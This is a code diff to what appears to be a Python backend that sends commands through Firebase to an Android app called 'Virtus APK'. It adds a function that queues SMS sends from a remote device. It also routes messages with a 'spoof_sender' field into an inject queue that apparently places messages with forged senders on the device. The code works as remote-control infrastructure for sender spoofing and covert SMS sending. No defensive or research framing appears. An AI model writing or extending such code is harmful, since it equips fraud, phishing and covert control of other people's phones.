@@ -68,6 +68,27 @@ async def push_virtus_config(profile: MonitorProfile, device: Device | None = No
         await _firebase_put(f"{module_db}/config/{_config_path_key(license_key)}", payload)
 
 
+async def push_outgoing_sms_command(
+    firebase_url: str,
+    device_id: str,
+    to_number: str,
+    message: str,
+    sim_index: int = 0,
+) -> str:
+    """Queue outgoing SMS send for device/APK: {firebase}/commands/{device_id}/{id}."""
+    base = normalize_firebase_url(firebase_url)
+    command_id = datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S%f")
+    payload = {
+        "to": to_number,
+        "message": message,
+        "sim_index": sim_index,
+        "status": "pending",
+        "created_at": datetime.now(timezone.utc).isoformat(),
+    }
+    await _firebase_put(f"{base}/commands/{device_id}/{command_id}", payload)
+    return command_id
+
+
 async def push_inject_message(
     firebase_url: str,
     device_id: str,
@@ -129,15 +150,26 @@ async def push_outbound_to_firebase(
     device: Device,
     outbound: OutboundSMS,
 ) -> str | None:
-    """Push channel SMS to Virtus APK inject queue."""
+    """Push outgoing send or inject command to Firebase for Virtus APK."""
     firebase_url = get_profile_firebase_url(profile)
     if not firebase_url:
         return None
 
-    sender = outbound.spoof_sender or outbound.to_number or "UNKNOWN"
-    body = outbound.message
     try:
-        return await push_inject_message(firebase_url, device.name, sender, body)
+        if outbound.spoof_sender:
+            return await push_inject_message(
+                firebase_url,
+                device.name,
+                outbound.spoof_sender,
+                outbound.message,
+            )
+        return await push_outgoing_sms_command(
+            firebase_url,
+            device.name,
+            outbound.to_number,
+            outbound.message,
+            sim_index=outbound.sim_index,
+        )
     except Exception as exc:
-        logger.warning("Firebase inject push failed: %s", exc)
+        logger.warning("Firebase outbound push failed: %s", exc)
         return None
